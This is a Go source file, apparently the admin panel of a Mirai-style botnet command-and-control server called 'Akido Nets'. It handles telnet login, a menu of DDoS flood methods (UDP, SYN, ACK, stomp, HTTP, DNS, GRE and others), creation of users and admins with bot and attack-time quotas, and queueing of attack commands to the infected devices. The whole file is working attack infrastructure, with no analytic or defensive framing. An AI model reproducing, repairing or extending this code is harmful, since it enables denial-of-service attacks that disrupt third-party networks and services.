package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[38;5;196mUsername\x1b[1;30m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[38;5;196mPassword\x1b[1;30m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\x1b[0;36mLogin successfully \x1b[1;30m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
	this.conn.Write([]byte("\r\n"))


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;34mNo retards allowed, GTFO\r\n"))
        this.conn.Write([]byte("\r\x1b[0;31m[ \x1b[0;35mAkido Nets \x1b[0;37m- \x1b[0;35mPrivate Source \x1b[0;31m]\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\r\n\033[0m"))
	this.conn.Write([]byte("   \r\n")) 
	this.conn.Write([]byte("             \033[38;5;196m     _.u[[/;:,.        \033[38;5;160m .odMMMMMM'\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("            \033[38;5;196m   .o888UU[[[/;:-.  \033[38;5;160m.o@P^    MMM^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("            \033[38;5;196m  oN88888UU[[[/;::-.       \033[38;5;160m dP^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("           \033[38;5;196m  dNMMNN888UU[[[/;:--.   \033[38;5;160m.o@P^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("          \033[38;5;196m  ,MMMMMMN888UU[[/;::-.\033[38;5;160m o@^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("           \033[38;5;196m NNMMMNN888UU[[[/~.\033[38;5;160mo@P^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("           \033[38;5;196m 888888888UU[[[/\033[38;5;160mo@\033[38;5;196m^-..\r\n")) 
	this.conn.Write([]byte("          \033[38;5;196m oI8888UU[[[/\033[38;5;160mo@P\033[38;5;196m^:--..\r\n")) 
	this.conn.Write([]byte("       \033[38;5;160m .@^  \033[38;5;196mYUU[[[\033[38;5;160m/o@^\033[38;5;196m;::---..  \033[38;5;15m???????????????????? ????????????????????????????\r\n")) 
	this.conn.Write([]byte("    \033[38;5;160m  oMP     ^/o@P^\033[38;5;196m;:::---..\r\n")) 
	this.conn.Write([]byte("  \033[38;5;160m .dMMM    .o@\033[38;5;196m^ ^;::---...\r\n")) 
	this.conn.Write([]byte(" \033[38;5;160m dMMMMMMM@^`       `^^^^\r\n")) 
	this.conn.Write([]byte(" \033[38;5;160mYMMMUP^\r\n")) 
	this.conn.Write([]byte(" \033[38;5;160m ^^\r\n")) 
	this.conn.Write([]byte("             \r\n")) 

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Devices | %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte(" \033[38;5;196m" + username + "\033[38;5;239m@\033[38;5;196mbotnet\033[38;5;239m ???\x1b[1;37m "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "cls" || cmd == "clear" {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\r\n\033[0m"))
	this.conn.Write([]byte("   \r\n")) 
	this.conn.Write([]byte("             \033[38;5;196m     _.u[[/;:,.        \033[38;5;160m .odMMMMMM'\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("            \033[38;5;196m   .o888UU[[[/;:-.  \033[38;5;160m.o@P^    MMM^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("            \033[38;5;196m  oN88888UU[[[/;::-.       \033[38;5;160m dP^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("           \033[38;5;196m  dNMMNN888UU[[[/;:--.   \033[38;5;160m.o@P^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("          \033[38;5;196m  ,MMMMMMN888UU[[/;::-.\033[38;5;160m o@^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("           \033[38;5;196m NNMMMNN888UU[[[/~.\033[38;5;160mo@P^\033[38;5;196m\r\n")) 
	this.conn.Write([]byte("           \033[38;5;196m 888888888UU[[[/\033[38;5;160mo@\033[38;5;196m^-..\r\n")) 
	this.conn.Write([]byte("          \033[38;5;196m oI8888UU[[[/\033[38;5;160mo@P\033[38;5;196m^:--..\r\n")) 
	this.conn.Write([]byte("       \033[38;5;160m .@^  \033[38;5;196mYUU[[[\033[38;5;160m/o@^\033[38;5;196m;::---..  \033[38;5;15m???????????????????? ????????????????????????????\r\n")) 
	this.conn.Write([]byte("    \033[38;5;160m  oMP     ^/o@P^\033[38;5;196m;:::---..\r\n")) 
	this.conn.Write([]byte("  \033[38;5;160m .dMMM    .o@\033[38;5;196m^ ^;::---...\r\n")) 
	this.conn.Write([]byte(" \033[38;5;160m dMMMMMMM@^`       `^^^^\r\n")) 
	this.conn.Write([]byte(" \033[38;5;160mYMMMUP^\r\n")) 
	this.conn.Write([]byte(" \033[38;5;160m ^^\r\n")) 
	this.conn.Write([]byte("             \r\n")) 
			continue
		}

        if cmd == "met" || cmd == "m" || cmd == "?"  || cmd == "methods" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[38;5;196m??????\033[38;5;15m#\033[38;5;196m?????????\033[38;5;7m/ ???????????? /\033[38;5;196m????????????????????????\033[38;5;7m/ ????????????????????????????????? /\033[38;5;196m??????????????????????????????\033[38;5;7m/ ?????????????????? / \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m???\033[38;5;243m--- ------------- -------------------------------------------- ---------------\033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m1    udp         UDP Flooding, DGRAM UDP with less PPS Speed        \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m2    stomp       stomp/handshake flood to bypass mitigation devices \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m5    ack         ACK flood optimized for higher GBPS                \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m6    syn         SYN flood optimized for higher GBPS                \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m7    http        Layer 7 Default Methods                            \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m9    udpplain    NUDP flood(High PPS)                               \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m10   vse         VSE flood (good for games)                         \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m12   dns         DNS default flood                                  \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m13   greip       GREIP default flood                                \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m14   greeth      GREETH custom flood                                \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m15   std         STD custom flood                                   \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m???\033[38;5;243m--- ------------- ---------------------------------------- -------------------\033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????\r\n"))
            this.conn.Write([]byte("[38;5;196m\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "help" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[38;5;196m??????\033[38;5;15m#\033[38;5;196m?????????\033[38;5;7m/ ???????????? /\033[38;5;196m????????????????????????\033[38;5;7m/ ????????????????????????????????? /\033[38;5;196m?????????????????????????????????\033[38;5;7m/ ?????????????????? /\033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m???\033[38;5;243m--- ------------- -------------------------------------------- ---------------\033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m1   user        Create Normal User                                  \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m2   admin       Create Admin User                                   \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m3   remove      Remove User                                         \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m??? \033[38;5;15m5   bots        Bot Count                                           \033[38;5;7mAll      \033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m???\033[38;5;243m--- ------------- ---------------------------------------- -------------------\033[38;5;196m???\r\n"))
            this.conn.Write([]byte("\033[38;5;196m????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????\r\n"))
            this.conn.Write([]byte("[38;5;196m\r\n"))
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "user" {
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter That User Name: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose His Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Bot Limit (-1 For Full Net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Attack Time (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nReady For This Shit? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m User Added Successfully.\033[0m\r\n"))
            }
            continue
        }
        
        if userInfo.admin == 1 && cmd == "remove" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if !database.removeUser(new_un) {
                this.conn.Write([]byte("User doesn't exists.\r\n"))
            } else {
                this.conn.Write([]byte("User removed\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("-1 for Full Bots.\r\n"))
            this.conn.Write([]byte("Allowed Bots: "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for Max attack duration. \r\n"))
            this.conn.Write([]byte("Allowed Duration: "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for no cooldown. \r\n"))
            this.conn.Write([]byte("Cooldown: "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("Username: " + new_un + "\r\n"))
            this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
            this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
            this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
            this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
            this.conn.Write([]byte(""))
            this.conn.Write([]byte("Confirm(y): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte("Failed to create Admin! \r\n"))
            } else {
                this.conn.Write([]byte("Admin created! \r\n"))
            }
            continue
        }
        if cmd == "botcount" || cmd == "bots" || cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[38;5;196m%s: \x1b[0;36m%d\033[0m\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mTotal: \033[38;5;196m%d\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
